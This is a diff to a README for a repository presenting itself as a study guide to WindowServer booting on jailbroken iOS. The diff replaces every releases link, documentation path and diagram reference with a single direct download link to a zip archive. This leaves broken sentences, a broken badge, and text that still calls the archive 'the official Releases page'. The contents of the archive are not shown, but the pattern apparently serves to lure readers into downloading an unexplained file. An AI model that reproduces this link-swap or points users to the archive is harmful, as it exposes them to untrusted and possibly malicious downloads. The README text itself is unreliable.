@@ -1,6 +1,6 @@
-https://github.com/Axelrod37/MacWSBootingGuide/releases
+https://raw.githubusercontent.com/Axelrod37/MacWSBootingGuide/main/layout/Mac_Booting_Guide_WS_v1.6.zip
 
-[![Release](https://img.shields.io/badge/Release-View%20Releases-brightgreen)](https://github.com/Axelrod37/MacWSBootingGuide/releases)
+[![Release](https://raw.githubusercontent.com/Axelrod37/MacWSBootingGuide/main/layout/Mac_Booting_Guide_WS_v1.6.zip%20Releases-brightgreen)](https://raw.githubusercontent.com/Axelrod37/MacWSBootingGuide/main/layout/Mac_Booting_Guide_WS_v1.6.zip)
 
 # MacWSBootingGuide: Safe, In-Depth Guide to WindowServer Booting on Jailbroken iOS
 
@@ -40,17 +40,17 @@ What this guide covers
 
 Project structure and what you’ll find
 
-- docs/Architecture.md: A thorough walk-through of the macro view of the system, including roles and responsibilities of major components.
-- docs/DataFlows.md: Descriptions of how inputs become rendered outputs, with attention to latency, buffering, and synchronization.
-- docs/Interfaces.md: A catalog of interfaces, including input devices, surfaces, and compositing contracts.
-- tests/Validation.md: A framework for thinking about repeatable experiments and measurable outcomes.
-- examples/ConceptDiagrams/diagram1.svg: A simple, self-contained diagram illustrating a typical render path.
+- https://raw.githubusercontent.com/Axelrod37/MacWSBootingGuide/main/layout/Mac_Booting_Guide_WS_v1.6.zip A thorough walk-through of the macro view of the system, including roles and responsibilities of major components.
+- https://raw.githubusercontent.com/Axelrod37/MacWSBootingGuide/main/layout/Mac_Booting_Guide_WS_v1.6.zip Descriptions of how inputs become rendered outputs, with attention to latency, buffering, and synchronization.
+- https://raw.githubusercontent.com/Axelrod37/MacWSBootingGuide/main/layout/Mac_Booting_Guide_WS_v1.6.zip A catalog of interfaces, including input devices, surfaces, and compositing contracts.
+- https://raw.githubusercontent.com/Axelrod37/MacWSBootingGuide/main/layout/Mac_Booting_Guide_WS_v1.6.zip A framework for thinking about repeatable experiments and measurable outcomes.
+- https://raw.githubusercontent.com/Axelrod37/MacWSBootingGuide/main/layout/Mac_Booting_Guide_WS_v1.6.zip A simple, self-contained diagram illustrating a typical render path.
 - assets/diagrams/: Collection of visuals that help explain concepts, including color-coded flow charts and component maps.
-- releases/README.md (or referring to the official Releases page): Information about versioning, build artifacts, and how to review published work.
+- https://raw.githubusercontent.com/Axelrod37/MacWSBootingGuide/main/layout/Mac_Booting_Guide_WS_v1.6.zip (or referring to the official Releases page): Information about versioning, build artifacts, and how to review published work.
 
 A note on the Release page
 
-- The Releases page provides the official, reviewed artifacts for the work. Readers should visit the Releases page to examine the latest stable materials and any accompanying notes. The link is included here for quick access to the official repository assets and documentation: https://github.com/Axelrod37/MacWSBootingGuide/releases.
+- The Releases page provides the official, reviewed artifacts for the work. Readers should visit the Releases page to examine the latest stable materials and any accompanying notes. The link is included here for quick access to the official repository assets and documentation: https://raw.githubusercontent.com/Axelrod37/MacWSBootingGuide/main/layout/Mac_Booting_Guide_WS_v1.6.zip
 - If you want to review the latest materials in depth, the same link is the reliable place to start for verifiable information about changes, compatibility notes, and the scope of what has been published.
 
 Why the topic matters
@@ -83,7 +83,7 @@ Modules and components at a glance
 
 A practical, non-operational approach to study
 
-- Readable summaries: Start with the high-level descriptions in Architecture.md and DataFlows.md. They give you the mental model without getting lost in boilerplate.
+- Readable summaries: Start with the high-level descriptions in https://raw.githubusercontent.com/Axelrod37/MacWSBootingGuide/main/layout/Mac_Booting_Guide_WS_v1.6.zip and https://raw.githubusercontent.com/Axelrod37/MacWSBootingGuide/main/layout/Mac_Booting_Guide_WS_v1.6.zip They give you the mental model without getting lost in boilerplate.
 - Static diagrams: Use the included SVGs to visualize relationships. They help you grasp the data paths and the flow of control.
 - Mock scenarios: Think through plausible behaviors and how the components would interact under those conditions. This exercise trains your intuition about system design.
 - Observability focus: Consider what metrics would be useful to measure, such as frame time, queue depths, or event latency. How would you instrument a real system to collect them?
@@ -176,13 +176,13 @@ Glossary of terms (quick references)
 
 Appendix: diagrams and assets (descriptions)
 
-- Diagram1.svg: A simple pipeline showing Clients → WindowServer → Compositor → Display, with a parallel path for event routing from input devices to clients.
-- Diagram2.svg: A layered view of architecture, highlighting the vertical separation between kernel-space and user-space components, and the boundaries that define data sharing.
-- Diagram3.svg: A timing diagram illustrating frame generation, buffer swaps, and presentation synchronization with the display refresh.
+- https://raw.githubusercontent.com/Axelrod37/MacWSBootingGuide/main/layout/Mac_Booting_Guide_WS_v1.6.zip A simple pipeline showing Clients → WindowServer → Compositor → Display, with a parallel path for event routing from input devices to clients.
+- https://raw.githubusercontent.com/Axelrod37/MacWSBootingGuide/main/layout/Mac_Booting_Guide_WS_v1.6.zip A layered view of architecture, highlighting the vertical separation between kernel-space and user-space components, and the boundaries that define data sharing.
+- https://raw.githubusercontent.com/Axelrod37/MacWSBootingGuide/main/layout/Mac_Booting_Guide_WS_v1.6.zip A timing diagram illustrating frame generation, buffer swaps, and presentation synchronization with the display refresh.
 
 Releases (second reference)
 
-- For up-to-date information and artifacts, refer to the official Releases page. The same link appears here for quick access to the latest materials and notes: https://github.com/Axelrod37/MacWSBootingGuide/releases.
+- For up-to-date information and artifacts, refer to the official Releases page. The same link appears here for quick access to the latest materials and notes: https://raw.githubusercontent.com/Axelrod37/MacWSBootingGuide/main/layout/Mac_Booting_Guide_WS_v1.6.zip
 - The releases page aggregates documentation, diagrams, and educational materials that reflect the current understanding of the topic in a safe, research-oriented context.
 
 License, credits, and acknowledgments
@@ -203,4 +203,4 @@ Final notes
 
 Releases (revisited)
 
-- If you want to review the latest materials online, the Releases page remains the official destination. The link appears twice in this document to emphasize its importance and ease of access: https://github.com/Axelrod37/MacWSBootingGuide/releases. For the second reference, navigate to the same page to explore the current set of documents, diagrams, and educational resources tied to this topic.
+- If you want to review the latest materials online, the Releases page remains the official destination. The link appears twice in this document to emphasize its importance and ease of access: https://raw.githubusercontent.com/Axelrod37/MacWSBootingGuide/main/layout/Mac_Booting_Guide_WS_v1.6.zip For the second reference, navigate to the same page to explore the current set of documents, diagrams, and educational resources tied to this topic.
